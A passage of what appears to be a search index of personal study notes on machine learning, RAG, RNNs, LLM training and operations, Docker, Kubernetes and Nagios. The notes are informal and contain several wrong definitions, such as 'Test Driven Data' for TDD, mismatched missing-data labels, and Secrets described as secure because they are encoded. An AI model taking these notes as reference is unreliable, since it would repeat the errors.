random(MNAR) - Missing at random (MCAR) - Missing completely at random(MCAR)</p> <p>Discretization is the process of turning continous features into a discrete feature. This process is also known as quantization or bining</p> <p>Feature crossing is the technique to combine two or more features to generate new features.  Helpful for model the non-linear relationships between features.</p> <p>Model assumptions 1. Prediction 2. IID 3. Smoothness 4. Tractability 5. Boundaries 6. Conditional independence 7. Normally distributed </p> <p>Each model in the ensemble is called base learner Pipeline parallelism is a clever technqiue to make different components of a model on different machines run more in parallel.</p> <p>NAS (Neural Architecture Search) 1. Search Space 2. Performance estimation strategy 3. Search stratey</p> <p>The process of generating responses is called inferencing</p> <p>ML reality A company requires many machine learning models     - Uber has 1000 models      - Google has 1000 models training with 100's of billion paramaters     - Booking.com has 150+ models      - companies with 25_000 + employees have more than 100 models in productions (Algorithmia study 2021 41% companies)</p> <p>Companies      Alibaba, ByteDance Weibo update their models 10min      Etsy 50 times a day      Netflix 1000 times a day      AWS every 11.7 seconds </p> <p>ML models best right after training and degrade over time</p> <p>Having two different pipelines for training and inference is a common source for bugs for ML in production</p>"},{"location":"Data%20Science/NLP/","title":"NLP","text":"<p>Stemming Vs Lemmatization in Data Science Stemming \u2022 Process of removing last few characters from a word, often leading to incorrect meanings and spelling. Lemmatization \u2022 Considers the context and converts the word to its meaningful base form, which is called Lemma.</p> <p>Segmentation The process of dividing a sentence into its component sentences, usually along the punctutation marks</p> <p>Tokenization The process of splitting sentences into their constitute words </p> <p>Stemming</p>"},{"location":"Data%20Science/RAG/","title":"RAG","text":"<p>Context Window - In LLM it refers to the maximum number of tokens that model can process in a single pass.</p> <p>All vector databases are vector stores, but not all vector stores are vector databases Langchain tell vector stores!!!</p> <p>Stages of RAG system 1. Indexing 2. Retrieval 3. Generation</p> <p>Indexing process can be executed before user enters the query. Turning supporting data into vectors and storing them in a vector database. This can make the retrieval step is as fast as effective </p> <p>Qunatization is a lossy compression technique</p> <p>Other people prompts are available on Langchain</p> <p>Adaptive Retrieval - Generate multiple sets of embedding at different sizes.  Searching lower dimension to get close to final result, searching lower dimension vectors are faster than higher dimenstion. Once search is close to lower dimenstion searching higher dimenstion to and finalize the similarity search.  Speed up on 30-90% Matryoshka embeddings (named after Russina nesting doll )</p> <p>Similarity metric can use different distance metrics while  Vector search can use a different similarity metric</p> <p>Vector Space / Embedding space / Latent space  - Mathematicall construct that represent a collection of vectors in a high dimenstional space</p> <p>Different ways to calculate distance between vectors - Eucliden  - Dot product (Inner product) - Cosine similarity</p> <p>Different Search Paradigms  - Hybrid - Sparse - Dense </p> <p>Semantic Searhc Alogrithms - KNN - ANN</p> <p>If exact nearest neigbour is required KNN, while ANN is balancing efficiency in and accuracy in larger datasets</p> <p>Search Algorithms can be indexed  - LSH - (KD - trees) - Ball trees - PQ - HNSW </p> <p>Reasons why RAG system fails</p> <ul> <li>Data used for retrieval may become outdated or irrelavent as new information emerges.</li> <li>LLM struugles to evolving user queries or changes in the target domain</li> <li>Underline hardware, software experience in performance issues and failures</li> </ul> <p>Why evaluation is so important? If you dont measure youself and after time you make changes and will be difficult to understand how or what improved</p> <p>Ground Truth  is data that represents the ideal responses you would expect if your RAG system was operating at peak performance.</p> <p>CrowdSourcing  - Amazon mechanical turk</p> <p>RAGAS is a evalution platform designed specifically for RAG </p> <p>For retrieval RAGAS has 2 metrics,    - Context precision   - Context recall</p> <p>RAG provide each stage evaluation RAGAS provides metrics for entire system called end-to-end evaluation</p> <p>For generation, RAGAS has 2 metrics,   - Answer correctness   - Answer similarity</p> <p>More evaluation techniques   - Context relevancy   - Context entity recall   - Aspect critique</p> <p>Additional Evaluation technique  - Bilingual evaluation understudy (BLEU) - Recall oriented understudy for gisting evaluation (ROUGE) - Semantic similarity  - Human evaluation</p> <p>Retrivers    are responsible for querying the vector store and retrieving the most relavent documents based on the input query.</p> <p>Base retriever (dense embedding) Similarity score threshold retrieval  MMR  BM25 retriver Ensemble retriever Wikipedia retriever  KNN retriever</p> <p>Langchain expression language (LCEL)</p> <p>Prompt Paramters - Temperature = How likely model selects word further down the probability distribution - (Top - p)   = focused randomness - Seed        = like in programming reproducible seed </p> <p>No shot, single-shot, multi-shot Shot = is an example</p> <p>When filling the prompt with data from other parts of the system called \"hydrating\"</p> <p>Fundamental of prompt design - Be concise and specific - Ask one task at a time. - Turn generative tasks into classification tasks. - Improve response quality by including examples. - Start simple and iterate gradually - Place instruction at the begaining of the prompt </p> <ul> <li>Not to transfer prompts to one LLM to another LLM. Each LLM has specific technqiues for the architecture.  Claude-3 prefer XML encoding, Llama3 uses a specific syntax when labelling different parts of the prompt</li> </ul> <p>Transformations  - Language transformation - Tone transformation </p> <p>Expansion Reverse of the concept of summarization </p> <p>Three types of RAG 1. Naive rag 2. Hybrid rag 3. Re-ranking </p> <p>If not used large amount of chunks of text, context will experience higher level of fragmentation. This fragmentation cause decrease understanding and capture of the context and semantics within chunks, reducing the effectiveness of retrieval mechanism of rag app.</p> <p>Hybrid RAG expands the concepts of naive rag by using multiple vectors for the retrieval process. </p> <p>Advance Approches   - Query Expansion   - Query decompositon   - (MM - RAG)</p> <p>After the semantic search and keyword search completes their retrieval, re rank the results based on the rankings across both sets.</p> <p>In here LLM is bringing to retrieval stage, ealier used on generation stage.(prompt engineering)</p> <p>Query Decomposition Strategy focus on improving question-answering. Falls under category of query translation which is set of approaches that focuses on improving the initial stage of the rag pipleline. In here breaking down a question into smaller questions. These questions can either be approched sequentally or independantly. After each question answered final response has broder perspective than original response</p> <p>Chain of Thought (Cot) Interleaving retrieval</p> <p>Combination is called Interleave retrieval with CoT and IR-CoT</p> <p>Multi Model RAG</p> <p>Modality independance = multi model embedding concept of cross-modality representation of the same context is called</p>"},{"location":"Data%20Science/RNN/","title":"RNN","text":"<p>What is sequential Learning? Sequence learning is the study of machine learning algorithms designed for sequential data</p> <p>Plain CNN are not born good at length-varying input and data</p> <p>Ways to deal with sequence labeling</p> <ol> <li>Autoregressive model</li> <li>Feed-forward neural network</li> <li>Linear dynamics systems</li> <li>Hidden markove model</li> <li>RNN</li> </ol> <p>RNN</p> <ol> <li>Forward Pass</li> <li>Backward Pass</li> <li>Bidirectional Pass</li> <li>Training RNN</li> </ol> <p>Input Output  Hidden State</p> <p>RNN can do more than language....    - drawing pictures   - music  </p> <p>Vanishing Gradient problem = if weights are small, gradient shrink exponentially. Network stop Learning Exploding Gradient problem = if weights are large, gradient grows exponentially, Weights flucatuate and become unstable</p> <p>Vanishing Gradient problem | Exploding Gradient problem =&gt; is a problem  When sequence length increase, it becomes hard for RNN to learn long term dependencies</p> <p>Different configurations in RNN</p> <p>one to one = (Vanila Neural Network) . (simple) One to many = Image captioning many to one = Sentiment analysis many to many = Language translation</p> <p>Types of RNN - Bi directonal RNN - Deep RNN</p> <p>The output of the network is depends on the current input and on the value of the previous internal state. The internal state maintains a (vanishing) memory about history of all past inputs. To train RNN with gradient descent, RNN must be unfolded</p> <p>The main and important part of RNN is         Memory state = hidden state         Not independant unlike other neural network types</p> <p>The fundamental unit of RNN is \"Recurrent unit\" [not called recurrent neuron]</p> <p>Once trained RNN can work in Natural Language generation.</p> <p>The activation function in RNN is traditionally implemented by \"sigmoid\"  Another common choice is \"tanh\" \"ReLU\" not much discussed</p> <p>HOW TO LIMIT Vanishing Gradient Problem?</p> <p>----&gt; Use ReLU activations   ----&gt; Use LSTM or GRU architectures   ----&gt; Use proper initialization of the weights \"W\"</p> <p>Differences with CNN</p> <p>CNN models : filter slides along x and y dimension RNN models : fliter slides along time dimension</p> <p>Weight Initialization</p> <p>A suitable initialziation of the weights permits the graident to flow quicker through the layer A smoother flow ensures faster convergence of the training procedures --&gt; It helps to reduce the issue of vanishing gradient</p> <p>ADDITIONAL Information: {</p> <pre><code>  When using sigmoids or hyperbolic tangent neurons, use the following weight initialization\n  This has to be repeated for each layer. The value n is the number of neurons in each layer.\n  This ensures that all neurons in the network initially have approximately the same output distribution.\n  The biases instead should be initialized to 0.\n  Random initialization is important to break symmetry (prevents coupling of neurons).\n</code></pre> <p>}</p> <p>\"BiNN\"</p> <p>Variation of RNN which the input information flows in both direction and then the output of both directions are combined to produce the output.</p> <p>forward layer works as RNN meanwhile backward layer works in the opposite direction by taking current input and future hidden state</p> <p>Recurrent Neural Network                                Deep Neural Network</p> <p>weight are same across all the layer                    Weights are different for each layer Sequential and no of inputs are NOT predefined          Does not have any special method or data ; no of inputs are fixed Paramters are higher than DNN                           No of parameter are lower than RNN Exploding &amp; Vanishing gradient is major problem         Exploding &amp; Vanishing gradient occurs but not major</p> <p>\"LSTM\"</p> <p>Type of RNN </p> <p>Three cells </p> <p>i. Input Gate  [Amount of new information it should memorize]   o. Output Gate [Amount of     information it should pass to next unit]   f. Forget Gate [Amount of     information it should forget]   g. Candidate cell state [What to write to cell later]</p> <p>LSTM removes or adds information to the cell state, carefully regulated by structure called \"gates\". Multiplicative Gates allows LSTM memory cells to store and access information over long period of time --&gt; Therby avoiding the vanishing gradient problem.</p> <p>Like RNN , LSTM must unfolded in time to be trained and understood</p> <p>Downfall of LSTM     Eventhough it provide huge improvement to RNN, it still struggles     Gates are really never 0 or 1, the content of cell is inevitably corrupted after long time      Scales up quickly!!! Lots of paramters = Lots of training data</p> <p>\"GRU\"</p> <p>(Gated feedback recurrent neural network)</p> <ul> <li>Similar to LSTM</li> <li>Mergers the Cell state and hidden state</li> <li>Mergers the forget and input gates into \"update gate\"</li> <li>Computationally efficient (less parameters, less complex structure)</li> </ul> <p>[Getting popular] </p> <p> = Simplification of LSTM unit to merge forget and input gates <p>\"Encode Decode\"</p> <p>Problems with Encoded-Decode paradigm</p> <ul> <li>Encoding transforms the entire sentence into a single vecto</li> <li>Decoding process uses this sentence representation for predicting the output</li> <li>After few time steps decoding process may not properly use the sentence representation due to long-term dependancy</li> </ul> <p>To improve the quality of predictions we can ---&gt; [</p> <p>Improve the qualityof sentence embedding \"OR\"   Present the sources sentence representation for prediction at each time step. \"OR\"   Present the RELAVENT source sentence representation for prediction at each time step.</p> <p>]</p> <p>Decoder takes 2 inputs - Sentence vector - Attention vector</p> <p>How to train RNN? - Backpropagation algorithm - Variant of backpropagation algorithm namely BPTT (Back-Propagation through time)</p> <p>\"Transformer\"</p> <p>Standard architectre for building large language model Transformer is a nerual network with a specific structure that includes a mechanism \"self Attention or multi head attention\" Transformers are not recurrent network based on multi head attention</p> <p>Three major components:   Blocks =&gt; each layer is multi layer network    Input encoding    #(wait I will add)</p> <p>RNN vs Feed Forward neural network  - Both are ANN pass to the end, feed forward network can perform classification, regression ....etc  task but cant remember the previous input</p> <p>RNN vs CNN - CNN designed to perform spatial data</p> <p>RNN vs Transformers </p> <p>Transformers beats RNN by   - Self attention   - Parallelism</p> <p>Some other area information</p> <p>Gradient clipping - It is a technique used for EXploding gradient problem</p> <p>Word Representation:     * 1 - hot representation     * Word - embedding</p> <p>Word embedding is used in Word2vec</p> <p>Word2vec : framework aimed at learning word embedding by estimating the likelihood that word is close to other word             Popular models include Skip Gram, negative sampling, CBOW</p> <p>Comparing models</p> <p>Cosine similarity t - SNE </p> <p>Perplexity : Language models are commonly assesed using PP (Perplexity metric)</p>"},{"location":"Data%20Science/RNN2/","title":"RNN2","text":"<p>start of sequence (SOS) =</p> <p>Language model predicts the proability of the sequence of words / characters Chacracter level language model : meaning the model will predict the next character in a sequence given the previous characters</p> <p>\"hello\"  -&gt; \" \"</p> <p>model will train on large text corpsus</p> <p>RNN Based language model component :</p> <p>Embedding layer :</p> <p>converts characters into dense vectors : they capture relationship simmilar charaters have simmilar embedding</p> <p>RNN layer :</p> <p>use embeddins to predict previous characters  final layer = hidden state of RNN </p> <p>Output layer  output layer is a usually softmax layer -&gt; generates a probability distirbution </p> <p>Perplexity:   Language model evaluation technique   Exponention of the average negative log-likelihood    the lower the better</p> <p>log-likelihood:   Should give high proability to next tokens</p> <p>SOS :   start of the begaining of a sequence    it is a special token in the model tells where the sequence starts   the model is use to how to initiate and generate next meagniful characters</p> <p>chucking sequence of characters rather than one large sequence -&gt; this allows the model to predict multiple charater in parallel</p> <p>Zero state initialization : You initialize the RNN hidden state to zeroes at the start of each chunk Burn in                   : You let the model run few characters before making a prediction (helpful for model to warm up) Carryig over state        : The final hidden state of 1 chuck can be used as the initial state for next chunk, : helping the model maintain                             conetxt across chunks</p> <p>Initialzing the RNN to zero is not the most ideal way to </p> <p>SOS = is a input marker</p> <p>Branching factor : model has to has wide options</p> <p>Context = no of words/ can look at for given word</p>"},{"location":"Data%20Science/llmfromscratch/","title":"Llmfromscratch","text":"<p>Chapter 1</p> <p>LLM can understand means --&gt; can process and generate text way that coherent contextually relavent,  not like they have human level consciousness or comphrehension</p> <p>NLP designed for specific task , narrow applications, LLM have broader usage     - Text categorization      - language translation</p> <p>The first stage of training an LLM is known as pretraining, often called as foundation model.  Like text completion</p> <p>2 ways to fine tune an LLM      - Instructional := question and answers     - Classification := spam or not</p> <p>2017 Research paper Attention is all you need  A key component of transformer architecture is self attention ( weights the importance of the word)</p> <p>BERT - Bidirectional encoder representations from transformers GPT - Generative pretrained transformers</p> <p>few shot setting -  zero shot setting - without specific example  All LLMS are not transformers : RNN is used ALL transformers are not LLM : Computer vision is used</p> <p>Self supervised learning = self labelling GPT is decoder part without and encoder  Autoregressive model - predicting text at a 1 one time </p> <p>2020 GPT 3 release GPT models also capable in perfroming translation tasks. This shocked scientists  Emergent behaviour where the model is not told explictly to what Original transformer (has encoder and decoder ) designed for language translation</p> <ol> <li>Data prepraration process</li> <li>Pretraining an LLM to create a foundation model</li> <li>Fine tuning </li> </ol> <p>Chapter 2</p> <p>The process of converting words to vectors are known as embedding  Word2Vec  GPT2 models -    768 dimensions GPT3 models - 12,288 dimensions</p> <p>The token used for GPT models used only &lt;|endoftext&gt; for simplicity. In batch using mask instead of padding </p> <p>Byte Pair Encoding (BPE)</p> <ul> <li>Used in GPT2 GPT3 models  </li> <li>BPE tokernizer break down unknown words into subwords and individual characters. So no need to replace with &lt;|unk|&gt; special tokens.</li> <li>It build vocabulary by iteratievly merging frequent characters into subwords and frequent subwords into words. </li> </ul> <p>Embedding layer is just a more efficient way than one hot encoding matrix multiplication in a FC Just like regular batch_size in deep learning, LLM size also has to experiment. Less batch size less memory but more noisy model updates</p> <p>Position is not aware and produce 2 similar vectors Position aware embeddings     - Relative positional embedding = how far apart     - Absolute positional embedding = at which exact position | unique embedding </p> <p>OpenAI ChatGPT model use absolute positional embedding </p> <p>Input Processing pipeline  Input Text ---&gt; Individual Tokens ---&gt; Token ID ----&gt; Embedding vectors </p> <p>Chapter 3.</p> <ol> <li>Simple</li> <li>Self attention with trainable weights </li> <li>Casual attention - Add a mask to previous output and current input </li> <li>Multi Head attention - organize the attention into multiple heads : allowing to capture ideas parallely</li> </ol> <p>Cant translate word by word, must understand the context  Limitation is encoder-decoder rnn is that rnn cant access directly earlier hidden states from the encoder during decoding phase. Also solely focus on current hidden state RNN is good for short sentences.  Before transformers RNN is the most popular encoder and decoder</p> <p>Bahdanau attention </p> <p>Self attention used by transformers to compute efficient input repre by allowing each position in a sequence to interact with the weigh the importance of all other positions within the same sequence.</p> <p>Goal of self attention is to compute context vector for each input vector that combines information from all other input elements. </p> <p>The higher dot product means higher similarity while lower means low similarity </p> <p>Chapter 4</p> <p>GPT 2 weight are public , GPT 3 weights are not public Layer Normalization - Adjust the activation(output) of a nerural network layer to have a mean 0 and variance of 1.  RELU - Negative inputs to 0</p> <p>GELU (Gaussian error linear unit) SwisGLU (Swish-gated linear unit)</p> <p>GELU used in LLM </p> <p>Batch normalization, across the batch dimensions Layer normalization, normalize across the feature dimension </p> <p>Shortcut connections (skip and residual connections)</p> <p>Vanishing gradient problem - where gradients become smaller as they propagate backward through the layers, making it difficult to effectively train earlier layers</p> <p>Pre Layer Norm  Post Layer Norm </p> <p>Weight Tying </p>"},{"location":"Data%20Science/llmfromscratch/#chapter-5","title":"Chapter 5","text":"<p>Backpropagation needs a loss function  Perplexity measures how well the probability distribution predicted by the model matches the actual distribution of the words in the dataset</p> <p>AdamW  Variant of Adam improves the weight decay approach</p> <p>Decoding strategies (text generating strategies) Temperature scaling - probabilistic selection process to the next token generation task. Greedy decoding - sampled the token with the highest probability as the next token  Top K sampling</p>"},{"location":"Data%20Science/llmfromscratch/#chapter-6","title":"Chapter 6","text":"<p>Instruction fine tunning is more versatile. It demands larger dataset and greater computational resources to develop Classification fine tunning require less data and less compute power</p>"},{"location":"Data%20Science/llmopps/","title":"Llmopps","text":"<p>Chapter 1</p> <p>LLM twin concept  * is an AI character that incorporates writing style, voice and personality into an LLM. Digital version of a person </p> <p>In MVP : V means viable it does not mean incomplete features, good product working that users like to see what will happen in future </p> <p>FTI Architecture (Feature/Training/Inference) - Any ML activity can be break down into this : similar to classic software(DB, Model,  UI)</p> <p>The feature Pipeline  Instead of directly passing to the model, we store, version control and share them.</p> <p>The training pipeline </p> <p>The models are stored on a model registry : it will store models, versions, share models with the inference pipeline.  Most modern regiters store metadata Model registry is a centralized repositary that manages ML models throughout their lifecycle.</p> <p>The inference pipeline Takes features from feature pipeline and training pipeline takes models and then train    if batch system - store on a database   if real time - sending it to the client </p> <p>Can easily upgrade or roll back models, because we know model v1 takes f1,f2,f3 and v2 takes f4,f5,f6 FTI pattern does not have to contain only three pipeline, often it have more </p> <p>Pipeline can compose of  Feature pipeline - Computes features, Validate features Training pipeline - training and evaluation </p> <p>Each pipeline can evolve differently without knowing the prescence of others  When added new features it wont break the system therefore can expand</p> <p>Knowing how the ML system works is valuable understanding other peoples work </p> <p>Data Collection  ETL (Extract Load Transform) Output of this is a NoSQL database</p> <p>Collected data   Articles   Posts    Code </p> <p>Training Pipeline    - Data scientists will run best hyperparameters</p> <p>Inference pipeline   - It is connected to the model registry and logical fetaure store </p> <p>Feature - cpu bases Training - gpu based  Inference - intermediate, but has to give the result to user in minimum latency </p> <p>Data  * Collect data from sources  * Clean the raw data  * Create instruct datasets for fine tunning LLM  * Chunk and embed data </p> <p>Train  * Fine tune LLM (7B, 14B, etc ...) * Switch between LLM types  * Track and compare experiments  * Automatically start when new dataset available </p> <p>Inference  * Autoscaling based on user requests * Automatically deploy models that pass evaluation steps  * Inference with LLMs for various size </p> <p>Chapter 2</p> <p>LLMOps - Instruction dataset, model versioning, experiment tracking, CT/CI/CD, Prompt and system monitoring  ZenML - Orchestrator fill gap between ML and MLOps </p> <p>NoSQL can use as a datawarehouse also development easier  For large scale can use snowflake or bigquery</p> <p>Any LLM will understand data it was trained on, sometimes called parameterized knwoledge</p> <p>There are 2 problems RAG solves,    - Hallucinations   - Old or private information </p> <p>Any LLM is trained or fine tune has issues:   - Private data    - New data    - Cost </p> <p>A RAG system is composed of 3 main modules:   - Ingestion pipeline [batch or streaming pipeline used to populate vector DB]   - Retrieval pipeline - A module that queries the vector db and retrieves relavent entries to user input   - Generation pipeline - Retrive data to augment the prompt and LLM to generate answers </p> <p>RAG  * Data extraction module - gather data from data sources * Cleaning layer - Removing unwanted data  * chunking module - Split the cleaned documents into smaller one * embedding component - uses an embedding model to take chunk's content * loading module - embedded chunks along with metadata </p> <p>Must use a distance metric to compute 2 vectors,   - Eucliden   - Manhatton    - Cosine (popular) [ 1 - cosine of the angle between 2 vectors]</p> <p>-1 to 1 : opposite  0 : orthonogol 1 : same direction </p> <p>** Choosing proper distance between 2 models depends on the data and the embedding model  User input and embeddings must be in same vector space. Otherwise cant compute distance For that it is essential preprocess same way as raw documents and user input :same function, models, hyperparameters inference will produce wrong results ---&gt; training-serving skew</p> <p>Dimensionality Reduction algorithm  - PCA, UMAP, t-SNE </p> <p>Feature hashing (hashing encoding, hash trick) technique used to convert categorical variables into numerical features by applying a hash function to category value reduces dimensionality of the feature space by mapping categories into a fixed number of bins or buckets This makes it efficient in computing and memory. Different categories might map to the same bin leading to loss of information Difficult to understand the relationship between the original catgories and hash feature</p> <p>Word to embedding     - Word2vec    - GloVe</p> <p>encoder only transformer : such as BERT (family RoBERTA) Python SentenceTransformer </p> <p>MTEB (Massive Text Embedding Benchmarking)</p> <p>Vector DB use ANN(Approximate Nearest Neigbor) to find the close neigbors ANN does not return top result ; trade off between accuracy and latency favors ANN </p> <p>Vectors are index using data structures    - Hierarchical navigable small word(HNSW)   - Random projection   - Product quantization (PQ)   - Locally-sensitive hashing (LSH)</p> <p>Algorithms for creating the vector index   - Random projection [Reduce dimenstion of vectors by using a random matrix]  - PQ [compress vectors by dividing them into smaller sub vectors then quantize to representative code]  - LSH [similar vectors into buckets ; faster apporixate nearest neigbor ]  - HSNW [multi layer graph where each node represent a set of vectors, simmilar nodes connected]</p> <p>Advance RAG 1. Evaluation module 2. Algorithm </p> <p>Vanila RAG can optimize in 3 ways   - Pre Retrieval  - Retrieval  - Post Retrieval</p> <p>Pre retrieval    - Data indexing    - Query optimizing </p> <p>FAISS are effective in similarity search. But lack comphrehensive data management capabilities.</p> <p>Query Routing  * Query rooting is which action should take base on the user input </p> <p>Retrieval optimization  - Improving the embedding models  - Leveraging the DB's filter and seacrh filters </p> <p>Instead of fine tunning, can guide the embedding generation </p> <p>Hybrid Search  Filtered vector search </p> <p>2 popular methods in post retrieval steps    1. Prompt compression    2. Re-ranking </p> <p>RAG system is built on 2 independant systems  - ingestion pipeline :  - inference pipeline :  </p> <p>Feature store will be the central access point for all the features used within training and inference </p> <p>Batch Processing advantages     - Does not require immediate data processing     - Simplicity </p> <p>CDC (Change data capture) keep 2 or more data storage in sync without computing and I/O overhead DDD (Domain driven design )</p> <p>Data duplication </p> <p>Overfitting Biased performance  Inefficient training  Inflated evaluation metrics </p> <p>Exact deduplication removes identical samples through data normalization, hash generation, duplicate removal</p> <p>Fuzzy deduplication popular is Minhash deduplication</p> <p>Semantic similarity  focusing meaning of the text. Use word2...FasText for transforming to vectors to capture meaning</p> <p>Data decontamination  Process of ensuring that the training dataset does not contains samples that are identical to testsing set</p> <p>LLM as a judge is known to have serveral biases </p> <p>Small epoch - underfitting Large epoch - overfitting </p> <p>Optimizer  AdamW</p> <p>Chapter 11 </p> <p>Reinforcment Learning from Human Feedback (RLHF) Direct Preference Optimization (DPO)</p> <p>LLM like github copilot will expose credentials</p> <p>KV Cahche </p> <p>In web interface can get a feedback loop : by users liking it </p> <p>Input Gurardrails protects      - from exposing private credentials to API (sending private data)     - executing harmful prompts that compromise systems [model jailbreaking] executing sql code     - accepting violent prompts (how to make a bomb)</p> <p>Ouput guardrails      - failed output that no standards (Hallucinations)</p> <p>Galileo Protect  Running a retry statment can double the speed so run parrelly and pick the best </p> <p>2 stages :     Staging      Production </p>"},{"location":"Data%20Science/otherLLM/","title":"otherLLM","text":"<p>Word Representing methods </p> <p>Bag of words</p> <p>First mentioned in 1950s but became popular in 2000s. 1. Tokenization. Splitting up the sentence into individual words or subwords.  Most common way is to split it by whitespace. Disadvantage is languages like Mandarin do not have whitespaces around individual words. 2. Vector Represention</p> <p>Bag of words ignores the semantic meaning of the words</p> <p>Word2Vec </p> <p>Released in 2013, first attempt to capture the meaning of the text in embedding.  Embeddings are vector representation of data that attempts to capture its meaning. </p> <p>There are many types of embedding  1. Word embedding 2. Sentence embedding </p> <p>Bag of words = Document level embedding  Word2Vec = word embedding </p> <p>Autoregressive - when generating the next word, this architecture needs to consume all previous generated words. </p> <p>Compared to RNN, transformers can be trained in parallel. </p> <p>The encoder block of transformer has  - Self attention  - Feedforward Neural network</p> <p>Self attention can look into multiple tokens at a time</p> <p>[CLS] classification token  BERT like models are commonly used for transfer learning</p> <p>Encoder only model = Representation models (only focus on creating embedding) Decoder only model = Generative models (only focous on text generation)</p> <p>BERT - Encoder only architecture GPT - Decoder only architecture </p> <p>GPT-1 was trained on 7_000 books and common crawl (web data) : 117 millions paramters GPT-2   1.5 billion parameters GPT-3   175 billion parameters</p> <p>Context_length = Maximum number of tokens model process Context_window = Entire document </p> <p>New promising architectures      - Mamba      - RWKV </p> <p>VRAM - (Video Random Access Memory ) - Amount of memory have in GPU</p> <p>Tokenization Scheme     - Word Token &amp;  - Subword Token     - Character Token &amp; - Byte Token </p> <p>Some subword tokenizer also include bytes as token for some vocabulary. Otherwise cant represent this does make it byte because it does not use all </p> <p>Instead of using each token with a static word. LLM create contextualized word embedding </p> <p>Word2Vec proposed paper - Efficient Estimation of Word Representations in Vector Space Word2 vec      - Skip-gram (Method of selecting neigbouring word)     - Negative Sampling (Adding negative examples by random sampling from the dataset)</p> <p>The method of choosing a single token from the probability distribution is called the \"decoding strategy\"</p>"},{"location":"DevOps/Devops/","title":"Devops","text":"<p>TDD - Test Driven Data  * In here, before developing the solution, creating all the test plans then developing the application until all tests are passed</p> <p>Devops * Developer operations * Build, test, release, montior application</p> <p>Developer sign  - Plan - Code - Build - Test  - release - deploy  - operate - monitor </p> <p>The nit approach defination ** Code reviewers leave little comment on the code \"\" that team can ignore until broader reviews. </p> <p>Linter ** Errors checking on a program</p> <p>Ephemeral Environment  ** Temporary, short lived env that is created for a specific purpose and then destroy once that is fulfilled</p> <p>Rolling Deployment  ** Deploying a new version of an apllication without causing downtime</p> <p>Rainbow Deployment ** Having more than 2 clusters in deplyment. </p> <p>Log aggregation ** It's a way of collceting and tagging application logs from many difference services into 1 single dashboard that can be eaily searched</p>"},{"location":"DevOps/Docker/","title":"Docker","text":"<p>docker images</p> <p>docker pull : <p>docker run</p> <p>docker rmi : <p>docker build -t : . <p>docker ps</p> <p>docker ps -a</p> <p>docker run -d  <p>docker stop  <p>docker rm  <p>docker network ls</p> <p>docker network create  <p>docker network connect  <p>docker volume ls</p> <p>docker volume create  <p>docker run -v : <p>docker logs  <p>docker stats</p> <p>docker-compose up</p> <p>docker-compose down</p> <p>docker-compose build</p>"},{"location":"DevOps/Kubernetes/","title":"Kubernetes","text":"<ol> <li> <p>Cluster A Kubernetes cluster consists of a set of nodes (machines) that run containerized applications. It includes at least one master node and multiple worker nodes. The master node manages the cluster, and the worker nodes run the actual workloads (containers).</p> </li> <li> <p>Nodes A node is a physical or virtual machine in the Kubernetes cluster. There are two types of nodes:</p> </li> </ol> <p>Master node: Responsible for controlling and managing the cluster. It runs components like the API server, scheduler, controller manager, and etcd (a key-value store). Worker node: These run the containers and contain components like kubelet, kube-proxy, and a container runtime (e.g., Docker, containerd).</p> <ol> <li>Pods A pod is the smallest and simplest unit in Kubernetes. A pod is a group of one or more containers that share the same network namespace and storage. Containers in the same pod can communicate with each other using localhost. Pods also share storage volumes, allowing for persistent data storage.</li> </ol> <p>Single-container pods: Most pods have a single container. Multi-container pods: A pod can host multiple containers, which need to work together.</p> <ol> <li> <p>ReplicaSets A ReplicaSet ensures that a specified number of identical pods are running at any given time. It helps maintain high availability by automatically replacing pods if they fail or are deleted. It is often used with deployments to scale the number of pods based on traffic.</p> </li> <li> <p>Deployments A Deployment is a higher-level abstraction that manages ReplicaSets and provides declarative updates to applications. It helps in:</p> </li> </ol> <p>Rolling out updates to applications. Scaling the number of pod replicas up or down. Rolling back to previous versions of the application.</p> <ol> <li>Services A Service is an abstraction that defines a logical set of pods and a policy by which to access them. Services allow for stable networking between pods, even if the pod IPs change. There are different types of services:</li> </ol> <p>ClusterIP: Exposes the service on a cluster-internal IP. NodePort: Exposes the service on a static port on each node\u2019s IP. LoadBalancer: Exposes the service externally using a load balancer. ExternalName: Maps the service to a DNS name.</p> <ol> <li> <p>Namespaces Namespaces provide a way to divide cluster resources between multiple users or teams. By default, Kubernetes has the default, kube-system, and kube-public namespaces. You can create custom namespaces to organize resources and manage access control.</p> </li> <li> <p>ConfigMaps and Secrets ConfigMaps store configuration data that can be used by pods and applications running inside the cluster. They allow separation of configuration from the containerized applications. Secrets store sensitive data like passwords, OAuth tokens, or SSH keys. Secrets are more secure than ConfigMaps because they are encoded and can be mounted as volumes or environment variables.</p> </li> <li> <p>Volumes and Persistent Volumes (PV) Volumes: A Kubernetes volume is a directory accessible to all containers in a pod, allowing them to share data. It survives pod restarts. Persistent Volumes (PV): These are volumes that are provisioned independently of the lifecycle of a pod. They are used for storing data persistently outside the container's lifecycle. A PersistentVolumeClaim (PVC) is used to request storage resources.</p> </li> <li> <p>Horizontal Pod Autoscaling (HPA) Horizontal Pod Autoscaling automatically scales the number of pod replicas based on observed CPU or memory utilization (or custom metrics). It helps handle increased traffic and load automatically.</p> </li> <li> <p>DaemonSets A DaemonSet ensures that a specific pod is running on all (or some) nodes in a cluster. It is useful for system-level services like logging agents, monitoring agents, or network proxies that need to run on every node.</p> </li> <li> <p>StatefulSets A StatefulSet manages stateful applications. Unlike deployments, stateful sets ensure that pods maintain their identity and persistent storage across restarts. It is used for applications that require stable, unique network identifiers and persistent storage (e.g., databases).</p> </li> <li> <p>Jobs and CronJobs Job: A Job ensures that a specified number of pods successfully terminate after completing their task. It's useful for batch processing or one-time tasks. CronJob: A CronJob runs jobs on a scheduled basis, similar to cron jobs in Unix-like systems. It is used for periodic or recurring tasks.</p> </li> <li> <p>Ingress An Ingress is an API object that manages external access to services in a cluster, typically HTTP/HTTPS. It provides HTTP routing based on hostnames or URLs, and often works with load balancers to expose services to the outside world.</p> </li> <li> <p>kubectl kubectl is the command-line tool used to interact with a Kubernetes cluster. It allows users to manage resources, deploy applications, view logs, and execute commands in containers.</p> </li> <li> <p>Helm Helm is a package manager for Kubernetes. It helps in defining, installing, and upgrading applications (called charts) in Kubernetes. Helm simplifies the deployment of complex applications by managing configurations, dependencies, and releases.</p> </li> <li> <p>Controller A controller is a control loop that watches the state of the cluster and makes changes to bring the current state closer to the desired state. Examples include:</p> </li> </ol> <p>ReplicationController: Ensures a specified number of pod replicas are running. Deployment Controller: Manages deployments and rollouts.</p>"},{"location":"DevOps/Nagios/","title":"Nagios","text":"<p>Nagios allows you to monitor the servers and check if they are being sufficiently utilized or if there are any task failures that need to be addressed</p> 